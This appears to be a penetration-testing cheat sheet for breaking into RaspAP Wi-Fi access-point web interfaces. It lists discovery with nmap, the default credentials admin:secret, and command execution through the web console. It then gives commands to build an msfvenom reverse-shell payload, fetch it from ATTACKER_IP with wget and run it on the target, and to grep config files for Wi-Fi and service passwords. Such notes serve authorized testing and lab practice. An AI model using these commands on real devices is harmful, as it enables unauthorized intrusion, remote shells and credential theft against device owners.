# RaspAP

RaspAP is a web interface for managing Wi-Fi access points. It commonly runs under `lighttpd` with HTTP Basic Auth.

## Discovery

```bash
nmap -sC -sV TARGET -p 8091
# 8091/tcp open  http  lighttpd
# http-auth: Basic realm=RaspAP
```

Browse to:

```text
http://TARGET:8091/
```

## Default Credentials

```text
admin:secret
```

## Web Console

After login, check for a system info or console page:

```text
/index.php?page=system_info
```

The console may execute commands as the web server user:

```bash
id
pwd
ls -la /home
```

If the web console is awkward for reverse shell metacharacters, upload and run a small ELF payload:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f elf -o shell.elf
python3 -m http.server 8000
```

From the web console:

```bash
wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf &
```

## Interesting Files

Search RaspAP config for Wi-Fi and service credentials:

```bash
grep -r -i "pass\|password\|wpa" /var/www/html/config/
```

Common hit:

```text
hostapd.conf:wpa_passphrase=ChangeMe
```

Also check `sudo -l`; RaspAP installs often grant web-facing users service-management commands such as `systemctl start/stop hostapd` or `dnsmasq`.
